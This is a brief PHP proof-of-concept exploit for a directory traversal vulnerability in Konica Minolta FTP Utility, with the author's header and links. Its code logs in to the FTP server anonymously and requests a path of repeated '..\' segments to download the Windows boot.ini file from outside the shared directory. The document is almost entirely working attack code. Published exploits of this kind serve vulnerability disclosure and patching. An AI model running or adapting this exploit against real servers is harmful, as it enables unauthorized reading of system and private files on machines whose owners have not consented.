/*
---------------------------------------------------------------------
Konica Minolta FTP Utility directory traversal vulnerability
Url: http://download.konicaminolta.hk/bt/driver/mfpu/ftpu/ftpu_10.zip

Author: shinnai
mail: shinnai[at]autistici[dot]org
site: http://www.shinnai.altervista.org/
Poc: http://shinnai.altervista.org/exploits/SH-0024-20150922.html
---------------------------------------------------------------------
*/

<?php
   $local_file = 'boot.ini.txt';
   $server_file = '..\..\..\..\..\..\..\..\boot.ini';

   $conn_id = ftp_connect($ftp_server);
   $login_result = ftp_login($conn_id, "anonymous", "anonymous");

   if (ftp_get($conn_id, $local_file, $server_file, FTP_BINARY)) {
     echo "Successfully written to $local_file\n";
   } else {
     echo "There was a problem\n";
   }
   ftp_close($conn_id);
?>
---------------------------------------------------------------------